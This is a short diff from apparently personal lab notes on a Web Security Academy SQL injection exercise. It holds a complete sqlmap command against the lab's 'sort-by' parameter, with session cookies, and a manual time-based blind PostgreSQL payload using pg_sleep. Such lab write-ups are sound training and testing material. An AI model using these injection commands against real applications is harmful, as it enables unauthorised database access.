@@ -23,6 +23,7 @@ Automatic with sqlmap:
 
 sqlmap.py -u "https://LAB-ID.h1-web-security-academy.net:443/filtered_search?SearchTerm=test&sort-by=DATE&writer=" --cookie="_lab=48%7cMC4CFQCUigHc10K7RPnpgqQELxmnJC1XtAIVAIjxga6lfvULTXA5Pbqay2che1mf23VpCwRs7bp8k0P0WAnCIJh1MEhnSS%2b7xWrrVBgesSt08Mm7GHU6AMaFuhNMV79n6urUwKDt%2bvAmBTwIDGNzN3EcnM5lqarXKPo0JzTNR0i9BdZIvvAYXA%3d%3d; session=97xXNPN8LvO14nMh3tQLARSy47O67rgV" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.121 Safari/537.36" --referer="https://0ad500100381b261800cf872003800f1.h1-web-security-academy.net/filtered_search?SearchTerm=test&sort-by=DATE&writer=" --delay=0 --timeout=30 --retries=0 -p "sort-by" --level=3 --risk=1 --threads=1 --time-sec=5 -b --batch --current-user
 
+manual:
 Verification:
 sort-by=DATE;SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(7)+ELSE+pg_sleep(0)+END--
 
